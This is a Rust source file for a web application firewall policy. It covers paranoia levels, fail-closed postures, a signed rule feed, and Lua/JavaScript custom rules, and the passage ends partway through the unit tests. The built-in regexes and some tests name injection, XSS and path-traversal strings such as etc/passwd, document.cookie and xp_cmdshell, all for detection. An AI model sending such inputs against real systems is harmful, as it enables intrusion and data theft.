//! Web Application Firewall policy.
//!
//! Provides OWASP CRS-based request filtering, custom rules, and
//! configurable actions on match. Supports a remote rule-feed
//! subscription that hot-loads signed rule bundles into the running
//! policy without a restart.

use regex::Regex;
use sbproxy_config::types::FailureMode;
use serde::Deserialize;
use std::sync::Arc;

use super::feed::{FeedRuleAction, WafFeedConfig, WafFeedSubscriber};
use super::persistent::{PersistentBlockConfig, PersistentBlockStore};

/// Default paranoia level when none is configured. Mirrors the OWASP CRS
/// convention where 1 is the lowest false-positive setting.
const DEFAULT_PARANOIA: u8 = 1;

/// Maximum supported paranoia level. Matches the OWASP CRS 1-4 range.
const MAX_PARANOIA: u8 = 4;

/// Web Application Firewall policy.
///
/// Provides OWASP CRS-based request filtering, custom rules, and
/// configurable actions on match. The OWASP and custom-rule payloads
/// remain generic so they can accept additional rule attributes without
/// changing this envelope.
///
/// The `paranoia` field follows the OWASP CRS convention. Level 1 is the
/// default and runs only the lowest-false-positive rules. Levels 2-4
/// progressively enable stricter rules at the cost of more false
/// positives. Rules without an explicit paranoia attribute default to
/// paranoia=1 and therefore always run.
///
/// Two independent axes decide what happens to a request, and they are
/// worth keeping apart. [`Self::action_on_match`] and
/// [`Self::test_mode`] answer "a rule fired, now what".
/// [`Self::failure_posture()`] answers "a rule could not run, now
/// what". A detector can reasonably be in log-only mode while it is
/// being tuned and still need to refuse traffic it was unable to
/// inspect.
#[derive(Debug, Deserialize)]
pub struct WafPolicy {
    /// OWASP Core Rule Set configuration.
    #[serde(default)]
    pub owasp_crs: Option<serde_json::Value>,
    /// Action to take when a rule matches. The magic value `"log"`
    /// means "record the match and let the request through"; anything
    /// else (including the default) blocks.
    ///
    /// This is the *enforcement* axis: the WAF reached a verdict and
    /// the verdict was "refuse". It is a different question from
    /// [`Self::failure_posture()`], which covers the WAF being unable to
    /// reach a verdict at all. See the note on [`Self::test_mode`] for
    /// why this axis still has three spellings.
    #[serde(default)]
    pub action_on_match: Option<String>,
    /// If true, log matches but do not block. Overrides
    /// [`Self::action_on_match`] in the permissive direction.
    ///
    /// # Three spellings of one idea
    ///
    /// The enforcement axis is currently expressed three ways, and this
    /// field is one of them:
    ///
    /// 1. `test_mode: true` - policy-wide, read at four sites inside
    ///    [`Self::check_request`].
    /// 2. `action_on_match: "log"` - policy-wide, a magic string.
    /// 3. Per-rule [`FeedRuleAction::Log`] - carried on managed-bundle
    ///    and feed rules.
    ///
    /// `sbproxy_config::types::EnforcementMode` exists to collapse all
    /// three into one word. It is deliberately **not** wired here yet,
    /// because a partial migration would add a fourth spelling rather
    /// than remove two. Doing it properly means: replacing
    /// `FeedRuleAction::Log` on the rule struct in
    /// [`super::feed`] with the shared enum, so the per-rule and
    /// policy-wide axes speak one vocabulary; giving the policy an
    /// `enforcement: EnforcementMode` key that both legacy spellings
    /// resolve into (`test_mode: true` or `action_on_match: "log"`
    /// yields `Observe`); collapsing the four `self.test_mode` reads
    /// into a single resolved value computed once at the top of
    /// [`Self::check_request`]; and keeping the rule-level value as an
    /// override of the policy-level one, which is the only ordering
    /// that preserves today's behaviour. That work spans the feed
    /// module and is tracked separately.
    #[serde(default)]
    pub test_mode: bool,
    /// Legacy failure knob: if true, allow requests through when the
    /// WAF cannot reach a verdict.
    ///
    /// Superseded by [`Self::failure_posture()`], which spells the same
    /// decision with a word instead of a boolean whose polarity had to
    /// be re-derived at every site. This field still parses and is
    /// still honoured when `failure_posture` is absent, so existing
    /// configs are unaffected. Prefer `failure_posture` in new configs;
    /// `fail_open: true` is `failure_posture: open` and `fail_open:
    /// false` (the default) is `failure_posture: closed`.
    ///
    /// Read through [`Self::failure_posture()`], never directly.
    #[serde(default)]
    pub fail_open: bool,
    /// What the WAF does when it cannot reach a verdict on a request.
    ///
    /// # When this fires
    ///
    /// Exactly one condition reaches this knob today: a custom rule
    /// that could not be evaluated. That covers an invalid regex under
    /// `operator: rx`, an unknown `operator`, a rule with none of
    /// `pattern` / `lua_script` / `js_script`, and a Lua or JavaScript
    /// engine that failed to start or threw. Those are the cases where
    /// the WAF has no answer about the request rather than a permissive
    /// one.
    ///
    /// A rule that cannot be evaluated never stops the other rules from
    /// running (WOR-1152), and a block from any rule still wins over
    /// this posture. The posture only decides what happens to a request
    /// that nothing blocked *and* that the WAF could not fully
    /// evaluate.
    ///
    /// Built-in patterns, the managed OWASP CRS bundle, and feed rules
    /// cannot reach this branch: their regexes are compiled before they
    /// enter the corpus, so a bad one is dropped at load rather than
    /// failing per request.
    ///
    /// # Postures
    ///
    /// - `closed` (default, and what `fail_open: false` resolves to):
    ///   refuse the request with 403. A WAF that silently admits what
    ///   it could not inspect is worse than no WAF, because the config
    ///   still advertises protection.
    /// - `open` (what `fail_open: true` resolves to): admit the
    ///   request and claim nothing.
    /// - `degraded`: admit the request and mark the WAF guarantee as
    ///   not made for it. Same traffic outcome as `open`, but the
    ///   structured log carries `guarantee_waived`, so an operator can
    ///   alert on requests that went through uninspected.
    /// - `observe`: **rejected at config-compile time.** See below.
    ///
    /// `observe` means "admit, and record the decision the control
    /// would have taken". This branch exists precisely because the WAF
    /// did *not* take a decision, so the only counterfactual available
    /// is a restatement of the posture itself. `degraded` says the same
    /// thing and says it precisely, so offering both here would be a
    /// second spelling of one idea. The compiler rejects `observe` with
    /// an error naming this policy rather than accepting it and
    /// quietly treating it as `open`.
    ///
    /// # Upgrade note
    ///
    /// Before this field existed, `fail_open` was wired to a result
    /// variant that nothing ever constructed, so a custom rule the
    /// engine could not evaluate was logged and the request was treated
    /// as clean, whatever `fail_open` said. A config that carries a
    /// malformed custom rule and leaves `fail_open` at its default now
    /// gets the refusal it always asked for. Grep the logs for
    /// `custom rule engine error` before upgrading; the fix is to
    /// repair the rule, and `failure_posture: open` is the escape hatch
    /// if you need the old behaviour while you do.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub failure_posture: Option<FailureMode>,
    /// Paranoia level (1-4). Only rules whose paranoia attribute is less
    /// than or equal to this value are evaluated. Defaults to 1 (lowest
    /// false-positive). For backward compatibility, the value can also be
    /// supplied as `owasp_crs.paranoia_level`; the top-level field wins
    /// when both are present.
    #[serde(default)]
    pub paranoia: Option<u8>,
    /// Custom WAF rules.
    #[serde(default)]
    pub custom_rules: Vec<serde_json::Value>,
    /// Optional remote rule-feed subscription. When present and
    /// `enabled: true`, the policy spawns a background subscriber that
    /// hot-loads signed rule bundles from the publisher and merges them
    /// with the static rule corpus on every request. See
    /// [`WafFeedConfig`] for the wire shape and
    /// [`WafFeedSubscriber`] for the runtime behaviour.
    ///
    /// The deserialised config is the *blueprint*; the live
    /// subscriber that owns the background task lives in
    /// [`Self::feed_subscriber`].
    #[serde(default)]
    pub feed: Option<WafFeedConfig>,
    /// Live feed subscriber. Skipped from serde because it owns
    /// runtime state (an [`arc_swap::ArcSwap`] of the current
    /// [`super::feed::RuleSet`] plus a background task handle).
    /// Populated by [`Self::from_config`] when [`Self::feed`] is
    /// `Some(_)` and `enabled: true`.
    #[serde(skip)]
    pub feed_subscriber: Option<Arc<WafFeedSubscriber>>,
    /// Optional persistent, time-boxed block configuration. When present
    /// and `enabled: true`, clients that trip the WAF repeatedly are
    /// auto-escalated to a time-boxed block. See [`PersistentBlockConfig`].
    #[serde(default)]
    pub persistent_block: Option<PersistentBlockConfig>,
    /// Live persistent-block state machine. Skipped from serde because it
    /// owns runtime state (a bounded LRU and an optional shared store
    /// handle). Populated by [`Self::from_config`] when
    /// [`Self::persistent_block`] is `Some(_)` and `enabled: true`, then
    /// optionally upgraded to a shared backend via
    /// [`Self::with_block_store`].
    #[serde(skip)]
    pub block_store: Option<Arc<PersistentBlockStore>>,
}

/// Result of a WAF check.
pub enum WafResult {
    /// Request is clean - allow it through.
    Clean,
    /// Attack detected - block with a message.
    Blocked(String),
    /// The pass finished without a block, but at least one rule could
    /// not be evaluated, so "clean" would be a claim the WAF is not in
    /// a position to make. The string names the rules and the engine
    /// errors they produced.
    ///
    /// Only [`WafPolicy::check_request`] produces this, and only from
    /// the custom-rule loop. `Blocked` outranks it: a rule that did
    /// fire is a stronger fact than a rule that could not run. The
    /// caller routes this by
    /// [`WafPolicy::failure_posture()`].
    Error(String),
}

// --- OWASP-lite built-in patterns ---
//
// Each pattern carries an OWASP CRS-style paranoia tag. Paranoia=1 is the
// always-on baseline (high-confidence signatures). Paranoia>=2 patterns
// only run when the operator explicitly opts into a higher-strictness
// posture via `WafPolicy::paranoia`.

/// Built-in WAF signature with an associated paranoia level.
struct BuiltinPattern {
    name: &'static str,
    paranoia: u8,
    regex: std::sync::LazyLock<Regex>,
}

static SQLI_PATTERN: BuiltinPattern = BuiltinPattern {
    name: "sqli",
    paranoia: 1,
    regex: std::sync::LazyLock::new(|| {
        Regex::new(r"(?i)(union\s+select|or\s+1\s*=\s*1|'\s*or\s*'|drop\s+table|insert\s+into|select\s+.*\s+from|;\s*delete|;\s*update|--\s*$)").unwrap()
    }),
};

static XSS_PATTERN: BuiltinPattern = BuiltinPattern {
    name: "xss",
    paranoia: 1,
    regex: std::sync::LazyLock::new(|| {
        Regex::new(r"(?i)(<script|javascript:|on\w+\s*=|<img[^>]+onerror|<svg[^>]+onload|alert\s*\(|document\.cookie)").unwrap()
    }),
};

static PATH_TRAVERSAL_PATTERN: BuiltinPattern = BuiltinPattern {
    name: "path_traversal",
    paranoia: 1,
    regex: std::sync::LazyLock::new(|| {
        Regex::new(r"(\.\./|\.\.\\|%2e%2e|%252e|etc/passwd|/proc/self|/dev/null)").unwrap()
    }),
};

/// Stricter SQLi signature catching boolean-blind and time-delay edge
/// cases that the paranoia=1 corpus tolerates. Enabled at paranoia>=2.
static SQLI_STRICT_PATTERN: BuiltinPattern = BuiltinPattern {
    name: "sqli_strict",
    paranoia: 2,
    regex: std::sync::LazyLock::new(|| {
        Regex::new(r"(?i)(\bwaitfor\s+delay\b|\bbenchmark\s*\(|\bsleep\s*\(\s*\d+\s*\)|\bextractvalue\s*\(|\bload_file\s*\(|\binformation_schema\b|\bxp_cmdshell\b|\bcase\s+when\b.*\bthen\b)").unwrap()
    }),
};

impl WafPolicy {
    /// Build a WafPolicy from a generic JSON config value.
    ///
    /// When the deserialized config carries a `feed` block with
    /// `enabled: true`, a [`WafFeedSubscriber`] is built and its
    /// background task spawned on [`super::feed::WAF_FEED_TASKS`].
    /// Subscriber construction errors propagate; rule-feed downloads
    /// do *not* (a flaky publisher must never break config compile).
    ///
    /// Rejects `failure_posture: observe`, which has no meaning at this
    /// site. See [`Self::failure_posture()`] for the argument.
    pub fn from_config(value: serde_json::Value) -> anyhow::Result<Self> {
        let mut policy: Self = serde_json::from_value(value)?;
        if policy.failure_posture == Some(FailureMode::Observe) {
            anyhow::bail!(
                "waf policy: `failure_posture: observe` is not meaningful here. \
                 This posture applies when the WAF could not reach a verdict, so \
                 there is no verdict whose counterfactual could be recorded. Use \
                 `degraded` to admit the request and mark the WAF guarantee as not \
                 made, or `closed` to refuse it."
            );
        }
        if let Some(feed_cfg) = policy.feed.clone() {
            if feed_cfg.enabled {
                let sub = WafFeedSubscriber::new(feed_cfg)?;
                policy.feed_subscriber = Some(sub);
            }
        }
        if let Some(block_cfg) = policy.persistent_block.clone() {
            if block_cfg.enabled {
                // Compiles the `track_by: cel` key expression, so a
                // malformed one rejects the config here (WOR-2164).
                policy.block_store = Some(Arc::new(PersistentBlockStore::new(block_cfg)?));
            }
        }
        Ok(policy)
    }

    /// Attach a shared L2 store to the persistent-block state machine so
    /// time-boxed blocks are enforced across replicas. The `origin_id` is
    /// baked into every key so origins do not share block state.
    ///
    /// No-op when persistent blocking is not enabled (`block_store` is
    /// `None`). When `store` is `None` the local in-process map stays
    /// authoritative, matching the rate limiter's single-replica path.
    /// This reuses the existing rate-limit L2 store rather than
    /// introducing a new backend.
    pub fn with_block_store(
        mut self,
        store: Option<Arc<dyn sbproxy_platform::storage::KVStore>>,
        origin_id: &str,
    ) -> Self {
        if let Some(existing) = self.block_store.take() {
            // Rebuild the store with the shared backend attached,
            // reusing the compiled CEL key rather than reparsing it
            // (WOR-2164). The local map is freshly seeded (a replica
            // restart starts with an empty hot cache and relies on the
            // shared tier for durable state anyway).
            let rebuilt = existing.rebuilt_with_store(store, origin_id);
            self.block_store = Some(Arc::new(rebuilt));
        }
        self
    }

    /// The live persistent-block state machine, if persistent blocking
    /// is enabled. The enforcer calls [`PersistentBlockStore::is_blocked`]
    /// up front and [`PersistentBlockStore::record_strike`] after a deny.
    pub fn block_store(&self) -> Option<&Arc<PersistentBlockStore>> {
        self.block_store.as_ref()
    }

    /// Effective failure posture for this policy.
    ///
    /// The explicit `failure_posture` key wins. When it is absent the
    /// legacy [`Self::fail_open`] boolean is converted, so a config
    /// written before the key existed keeps its exact behaviour:
    /// `fail_open: true` is [`FailureMode::Open`] and the default
    /// `false` is [`FailureMode::Closed`].
    ///
    /// This is the only supported read path. Do not branch on
    /// `fail_open` directly; the polarity conversion belongs in one
    /// place.
    pub fn failure_posture(&self) -> FailureMode {
        self.failure_posture
            .unwrap_or_else(|| FailureMode::from_fail_open(self.fail_open))
    }

    /// Check whether OWASP CRS is enabled.
    fn owasp_enabled(&self) -> bool {
        match &self.owasp_crs {
            Some(v) => v.get("enabled").and_then(|e| e.as_bool()).unwrap_or(false),
            None => false,
        }
    }

    /// Check whether the shipped OWASP CRS managed bundle is enabled.
    ///
    /// Reads `owasp_crs.managed_bundle`. This is the one-flag enable for
    /// the in-tree CRS corpus (see [`super::bundle`]); it is independent
    /// of the signed remote feed and of `owasp_crs.enabled` (the built-in
    /// pattern toggle), so an operator can run the managed bundle with or
    /// without the legacy built-ins.
    fn managed_bundle_enabled(&self) -> bool {
        self.owasp_crs
            .as_ref()
            .and_then(|v| v.get("managed_bundle"))
            .and_then(|e| e.as_bool())
            .unwrap_or(false)
    }

    /// Resolve the effective paranoia level. The top-level `paranoia` field
    /// wins. If unset, fall back to `owasp_crs.paranoia_level` for OWASP
    /// CRS-style configs. Defaults to 1 and is clamped to the 1-4 range.
    fn effective_paranoia(&self) -> u8 {
        let raw = self.paranoia.or_else(|| {
            self.owasp_crs.as_ref().and_then(|v| {
                v.get("paranoia_level")
                    .and_then(|p| p.as_u64())
                    .map(|n| n as u8)
            })
        });
        let level = raw.unwrap_or(DEFAULT_PARANOIA);
        level.clamp(1, MAX_PARANOIA)
    }

    /// Check a request against WAF rules. Returns a WafResult indicating
    /// whether the request is clean, blocked, or if an error occurred.
    ///
    /// Rule selection follows the OWASP CRS paranoia model: only rules
    /// whose paranoia level is less than or equal to the policy's
    /// configured level are evaluated. Custom rules without a paranoia
    /// attribute default to paranoia=1 and therefore always run.
    ///
    /// # Which result you get
    ///
    /// - [`WafResult::Blocked`] as soon as any rule matches and the
    ///   effective action is to block. Evaluation short-circuits there,
    ///   because the request is already refused.
    /// - [`WafResult::Error`] when the pass completed without a block
    ///   but at least one custom rule could not be evaluated. Every
    ///   remaining rule still ran first (WOR-1152); this reports the
    ///   gap rather than closing the pass early on it.
    /// - [`WafResult::Clean`] only when every applicable rule ran and
    ///   none matched.
    pub fn check_request(
        &self,
        uri: &str,
        headers: &http::HeaderMap,
        body: Option<&str>,
    ) -> WafResult {
        let action = self.action_on_match.as_deref().unwrap_or("block");
        let paranoia = self.effective_paranoia();

        // --- OWASP CRS built-in patterns ---
        if self.owasp_enabled() {
            // URL-decode the URI before pattern matching (e.g., %3D -> =, + -> space)
            let decoded_uri = percent_encoding::percent_decode_str(uri)
                .decode_utf8_lossy()
                .replace('+', " ");

            // Collect all text to scan: decoded URI, header values, body.
            let header_text: String = headers
                .iter()
                .map(|(k, v)| format!("{}: {}", k.as_str(), v.to_str().unwrap_or("")))
                .collect::<Vec<_>>()
                .join("\n");

            let targets = [Some(decoded_uri.as_str()), Some(header_text.as_str()), body];

            // Built-in pattern corpus. Each entry carries an OWASP-style
            // paranoia tag and a human-readable block message.
            let builtins: [(&BuiltinPattern, &str); 4] = [
                (&SQLI_PATTERN, "WAF: SQL injection detected"),
                (&XSS_PATTERN, "WAF: XSS detected"),
                (&PATH_TRAVERSAL_PATTERN, "WAF: path traversal detected"),
                (&SQLI_STRICT_PATTERN, "WAF: SQL injection (strict) detected"),
            ];

            for target in targets.into_iter().flatten() {
                for (rule, block_msg) in builtins.iter() {
                    // Paranoia gate: skip rules above the configured level.
                    if rule.paranoia > paranoia {
                        continue;
                    }
                    if rule.regex.is_match(target) {
                        if action == "log" || self.test_mode {
                            tracing::warn!(
                                pattern = rule.name,
                                paranoia = rule.paranoia,
                                "WAF: pattern detected (log mode)"
                            );
                        } else {
                            return WafResult::Blocked((*block_msg).to_string());
                        }
                    }
                }
            }
        }

        // --- Shipped OWASP CRS managed bundle ---
        //
        // The vendored CRS corpus (see `super::bundle`). Enabled with the
        // single `owasp_crs.managed_bundle: true` flag and gated by the
        // same `paranoia` level as everything else. Distinct from the
        // signed remote feed: these rules ship in the binary, so there is
        // no network fetch and no signature step. The compiled rule set
        // is shared across policies (compiled once) so this branch only
        // clones an `Arc` and runs the regexes.
        if self.managed_bundle_enabled() {
            let bundle = super::bundle::crs_bundle();
            let decoded_uri = percent_encoding::percent_decode_str(uri)
                .decode_utf8_lossy()
                .replace('+', " ");
            let header_text: String = headers
                .iter()
                .map(|(k, v)| format!("{}: {}", k.as_str(), v.to_str().unwrap_or("")))
                .collect::<Vec<_>>()
                .join("\n");
            let targets = [Some(decoded_uri.as_str()), Some(header_text.as_str()), body];

            for rule in &bundle.rules {
                if rule.paranoia > paranoia {
                    continue;
                }
                let mut matched = false;
                for target in targets.into_iter().flatten() {
                    if rule.regex.is_match(target) {
                        matched = true;
                        break;
                    }
                }
                if !matched {
                    continue;
                }
                let log_only =
                    matches!(rule.action, FeedRuleAction::Log) || action == "log" || self.test_mode;
                if log_only {
                    tracing::warn!(
                        rule_id = rule.id.as_str(),
                        category = rule.category.as_str(),
                        paranoia = rule.paranoia,
                        "WAF CRS bundle: rule matched (log mode)"
                    );
                } else {
                    return WafResult::Blocked(format!(
                        "WAF OWASP CRS: {} matched [rule {}]",
                        rule.category, rule.id
                    ));
                }
            }
        }

        // --- Feed rules (subscribed via WafFeedSubscriber) ---
        //
        // Rules from the remote feed are evaluated alongside the
        // built-in corpus and the inline custom rules. Their paranoia
        // attribute is gated by the policy's `paranoia` setting just
        // like the built-in patterns. A rule from the feed with the
        // same `id` as a built-in or earlier custom rule is the
        // authoritative version; the static corpus does not carry
        // numeric ids today, so override is by-id only and only takes
        // effect against custom_rules below (which we filter
        // accordingly).
        //
        // The subscriber's background task is lazy-spawned on the
        // first request that reaches this branch, since OSS config
        // compile runs before Pingora's Tokio runtime exists. Once
        // started, the call is a no-op (`std::sync::Once`).
        if let Some(sub) = &self.feed_subscriber {
            sub.ensure_started();
        }
        let feed_snapshot = self.feed_subscriber.as_ref().map(|s| s.current_rules());
        let feed_rule_ids: std::collections::HashSet<&str> = match &feed_snapshot {
            Some(snap) => snap.rules.iter().map(|r| r.id.as_str()).collect(),
            None => std::collections::HashSet::new(),
        };
        if let Some(snap) = feed_snapshot.as_ref() {
            // URL-decoded URI plus joined headers, mirroring the
            // built-in scan corpus so feed signatures do not have to
            // re-implement encoding.
            let decoded_uri = percent_encoding::percent_decode_str(uri)
                .decode_utf8_lossy()
                .replace('+', " ");
            let header_text: String = headers
                .iter()
                .map(|(k, v)| format!("{}: {}", k.as_str(), v.to_str().unwrap_or("")))
                .collect::<Vec<_>>()
                .join("\n");
            let targets = [Some(decoded_uri.as_str()), Some(header_text.as_str()), body];

            for rule in &snap.rules {
                if rule.paranoia > paranoia {
                    continue;
                }
                let mut matched = false;
                for target in targets.into_iter().flatten() {
                    if rule.regex.is_match(target) {
                        matched = true;
                        break;
                    }
                }
                if !matched {
                    continue;
                }
                let log_only =
                    matches!(rule.action, FeedRuleAction::Log) || action == "log" || self.test_mode;
                if log_only {
                    tracing::warn!(
                        rule_id = rule.id.as_str(),
                        category = rule.category.as_str(),
                        paranoia = rule.paranoia,
                        "WAF feed: rule matched (log mode)"
                    );
                } else {
                    return WafResult::Blocked(format!(
                        "WAF feed: {} matched [rule {}]",
                        rule.category, rule.id
                    ));
                }
            }
        }

        // --- Custom rules ---
        //
        // Rules that blow up during evaluation are collected here
        // rather than aborting the loop. WOR-1152 pinned that a single
        // malformed rule must not stop the remaining rules from
        // enforcing, and it still does not. What changed is the verdict
        // afterwards: a pass with an unevaluated rule in it reports
        // `Error`, not `Clean`, so the operator's failure posture gets
        // to decide instead of the request being silently waved through
        // as inspected.
        let mut unevaluated: Vec<String> = Vec::new();
        for rule_value in &self.custom_rules {
            // Feed rules with the same `id` shadow inline custom rules.
            // Skip the inline rule when a feed rule of the same id
            // already evaluated above, so operators can override
            // bundled signatures from upstream without redeploying.
            if let Some(id) = rule_value.get("id").and_then(|v| v.as_str()) {
                if feed_rule_ids.contains(id) {
                    continue;
                }
            }
            // Paranoia gate for custom rules. Rules without a `paranoia`
            // attribute default to paranoia=1 (always run).
            let rule_paranoia = rule_value
                .get("paranoia")
                .and_then(|p| p.as_u64())
                .map(|n| (n as u8).clamp(1, MAX_PARANOIA))
                .unwrap_or(DEFAULT_PARANOIA);
            if rule_paranoia > paranoia {
                continue;
            }
            match self.evaluate_custom_rule(rule_value, uri, headers, body) {
                Ok(true) => {
                    // Rule matched.
                    let rule_action = rule_value
                        .get("action")
                        .and_then(|a| a.as_str())
                        .unwrap_or(action);
                    let message = rule_value
                        .get("message")
                        .and_then(|m| m.as_str())
                        .unwrap_or("WAF: custom rule matched");
                    let rule_id = rule_value
                        .get("id")
                        .and_then(|id| id.as_str())
                        .unwrap_or("unknown");

                    if rule_action == "log" || self.test_mode {
                        tracing::warn!(rule_id = rule_id, "WAF: custom rule matched (log mode)");
                    } else {
                        return WafResult::Blocked(format!("{} [rule {}]", message, rule_id));
                    }
                }
                Ok(false) => {} // No match, continue.
                Err(e) => {
                    // WOR-1152: a single malformed custom rule (e.g. an
                    // invalid regex) must not abort evaluation of the
                    // remaining rules or fail open by short-circuiting the
                    // whole pass. Log and skip this rule so later rules
                    // still enforce, but remember that this request was
                    // not fully inspected.
                    let rule_id = rule_value
                        .get("id")
                        .and_then(|id| id.as_str())
                        .unwrap_or("unknown");
                    tracing::warn!(
                        rule_id = rule_id,
                        error = %e,
                        "WAF: custom rule engine error; skipping rule, evaluation continues"
                    );
                    unevaluated.push(format!("{rule_id}: {e}"));
                    continue;
                }
            }
        }

        if !unevaluated.is_empty() {
            // Nothing blocked, but the pass was not complete. Reporting
            // `Clean` here would tell the caller the request was
            // inspected and found safe, which is not what happened.
            return WafResult::Error(format!(
                "{} custom rule(s) could not be evaluated: {}",
                unevaluated.len(),
                unevaluated.join("; ")
            ));
        }

        WafResult::Clean
    }

    /// Evaluate a single custom rule against the request.
    /// Returns Ok(true) if the rule matched, Ok(false) if not, Err on engine error.
    fn evaluate_custom_rule(
        &self,
        rule: &serde_json::Value,
        uri: &str,
        headers: &http::HeaderMap,
        body: Option<&str>,
    ) -> Result<bool, String> {
        // Check for Lua-based custom rules
        if let Some(lua_script) = rule.get("lua_script").and_then(|s| s.as_str()) {
            return self.evaluate_lua_custom_rule(lua_script, uri, headers, body);
        }

        // Check for JavaScript-based custom rules (js_script field, or engine: "javascript")
        let js_script = rule.get("js_script").and_then(|s| s.as_str()).or_else(|| {
            let engine = rule.get("engine").and_then(|e| e.as_str()).unwrap_or("lua");
            if engine == "javascript" {
                rule.get("script").and_then(|s| s.as_str())
            } else {
                None
            }
        });
        if let Some(script) = js_script {
            return self.evaluate_js_custom_rule(script, uri, headers, body);
        }

        let pattern = rule
            .get("pattern")
            .and_then(|p| p.as_str())
            .ok_or_else(|| {
                "custom rule missing 'pattern', 'lua_script', or 'js_script' field".to_string()
            })?;

        let operator = rule
            .get("operator")
            .and_then(|o| o.as_str())
            .unwrap_or("contains");

        let variables = rule
            .get("variables")
            .and_then(|v| v.as_array())
            .cloned()
            .unwrap_or_default();

        // If no variables specified, scan the full URI.
        if variables.is_empty() {
            return self.match_operator(operator, uri, pattern);
        }

        for var in &variables {
            let var_name = var
                .get("name")
                .and_then(|n| n.as_str())
                .unwrap_or("REQUEST_URI");
            let var_key = var.get("key").and_then(|k| k.as_str());

            let target_values = self.resolve_variable(var_name, var_key, uri, headers, body);
            for target in &target_values {
                if self.match_operator(operator, target, pattern)? {
                    return Ok(true);
                }
            }
        }

        Ok(false)
    }

    /// Evaluate a Lua-based custom WAF rule.
    ///
    /// The script must define a `match(request)` function that receives a
    /// request object with a `header()` method for looking up HTTP headers.
    /// Returns true if the rule matched (request should be blocked).
    fn evaluate_lua_custom_rule(
        &self,
        script: &str,
        uri: &str,
        headers: &http::HeaderMap,
        body: Option<&str>,
    ) -> Result<bool, String> {
        use sbproxy_extension::lua::LuaEngine;

        let engine = LuaEngine::new().map_err(|e| format!("Lua engine init error: {}", e))?;

        // Build headers map for the Lua engine
        let mut headers_map = std::collections::HashMap::new();
        for (name, value) in headers.iter() {
            if let Ok(v) = value.to_str() {
                headers_map.insert(name.as_str().to_string(), v.to_string());
            }
        }

        engine
            .waf_match(script, uri, &headers_map, body)
            .map_err(|e| format!("Lua WAF script error: {}", e))
    }

    /// Evaluate a JavaScript-based custom WAF rule.
    ///
    /// The script must define a `match(request)` function. The request object
    /// has `uri`, `headers`, `body` fields and a `header(name)` method for
    /// case-insensitive header lookup. Returns true if the rule matched
    /// (request should be blocked).
    ///
    /// Use `js_script` in the rule config, or set `engine: "javascript"` with
    /// a `script` field.
    fn evaluate_js_custom_rule(
        &self,
        script: &str,
        uri: &str,
        headers: &http::HeaderMap,
        body: Option<&str>,
    ) -> Result<bool, String> {
        use sbproxy_extension::js::JsEngine;

        let engine = JsEngine::new().map_err(|e| format!("JS engine init error: {}", e))?;

        // Build headers map for the JS engine
        let mut headers_map = std::collections::HashMap::new();
        for (name, value) in headers.iter() {
            if let Ok(v) = value.to_str() {
                headers_map.insert(name.as_str().to_string(), v.to_string());
            }
        }

        engine
            .waf_match(script, uri, &headers_map, body)
            .map_err(|e| format!("JS WAF script error: {}", e))
    }

    /// Resolve a WAF variable name to the actual string values to scan.
    fn resolve_variable(
        &self,
        name: &str,
        key: Option<&str>,
        uri: &str,
        headers: &http::HeaderMap,
        body: Option<&str>,
    ) -> Vec<String> {
        match name {
            "REQUEST_URI" => vec![uri.to_string()],
            "REQUEST_HEADERS" => {
                if let Some(header_name) = key {
                    headers
                        .get_all(header_name)
                        .iter()
                        .filter_map(|v| v.to_str().ok())
                        .map(|s| s.to_string())
                        .collect()
                } else {
                    // All header values.
                    headers
                        .iter()
                        .filter_map(|(_, v)| v.to_str().ok())
                        .map(|s| s.to_string())
                        .collect()
                }
            }
            "REQUEST_BODY" => {
                if let Some(b) = body {
                    vec![b.to_string()]
                } else {
                    vec![]
                }
            }
            _ => {
                tracing::debug!(variable = name, "WAF: unknown variable, skipping");
                vec![]
            }
        }
    }

    /// Apply the operator to check if target matches pattern.
    fn match_operator(&self, operator: &str, target: &str, pattern: &str) -> Result<bool, String> {
        match operator {
            "contains" => Ok(target.contains(pattern)),
            "rx" | "regex" => {
                let re = Regex::new(pattern)
                    .map_err(|e| format!("invalid regex '{}': {}", pattern, e))?;
                Ok(re.is_match(target))
            }
            "eq" | "equals" => Ok(target == pattern),
            "starts_with" => Ok(target.starts_with(pattern)),
            "ends_with" => Ok(target.ends_with(pattern)),
            _ => Err(format!("unknown WAF operator: {}", operator)),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_header_map(pairs: &[(&str, &str)]) -> http::HeaderMap {
        let mut map = http::HeaderMap::new();
        for (k, v) in pairs {
            map.insert(
                http::header::HeaderName::from_bytes(k.as_bytes()).unwrap(),
                http::HeaderValue::from_str(v).unwrap(),
            );
        }
        map
    }

    #[test]
    fn waf_js_rule_blocks_malicious_user_agent() {
        let policy = WafPolicy::from_config(serde_json::json!({
            "custom_rules": [
                {
                    "id": "js-ua-check",
                    "js_script": r#"
                        function match(request) {
                            const ua = request.header("user-agent") || "";
                            return ua.includes("malicious-bot");
                        }
                    "#,
                    "message": "blocked by JS rule"
                }
            ]
        }))
        .unwrap();

        let headers = make_header_map(&[("user-agent", "malicious-bot/1.0")]);
        let result = policy.check_request("/api", &headers, None);
        assert!(matches!(result, WafResult::Blocked(_)));
    }

    #[test]
    fn waf_js_rule_allows_safe_user_agent() {
        let policy = WafPolicy::from_config(serde_json::json!({
            "custom_rules": [
                {
                    "id": "js-ua-check",
                    "js_script": r#"
                        function match(request) {
                            const ua = request.header("user-agent") || "";
                            return ua.includes("malicious-bot");
                        }
                    "#,
                    "message": "blocked by JS rule"
                }
            ]
        }))
        .unwrap();

        let headers = make_header_map(&[("user-agent", "Mozilla/5.0 (safe browser)")]);
        let result = policy.check_request("/api", &headers, None);
        assert!(matches!(result, WafResult::Clean));
    }

    #[test]
    fn waf_js_rule_via_engine_field_blocks() {
        // Alternative config: engine: "javascript" + script field
        let policy = WafPolicy::from_config(serde_json::json!({
            "custom_rules": [
                {
                    "id": "js-uri-check",
                    "engine": "javascript",
                    "script": r#"
                        function match(request) {
                            return request.uri.includes("../");
                        }
                    "#,
                    "message": "path traversal blocked by JS"
                }
            ]
        }))
        .unwrap();

        let headers = make_header_map(&[]);
        let result = policy.check_request("/etc/../passwd", &headers, None);
        assert!(matches!(result, WafResult::Blocked(_)));
    }

    #[test]
    fn waf_js_rule_body_check_blocks() {
        let policy = WafPolicy::from_config(serde_json::json!({
            "custom_rules": [
                {
                    "id": "js-body-check",
                    "js_script": r#"
                        function match(request) {
                            const body = request.body || "";
                            return body.includes("<script>");
                        }
                    "#,
                    "message": "XSS blocked by JS rule"
                }
            ]
        }))
        .unwrap();

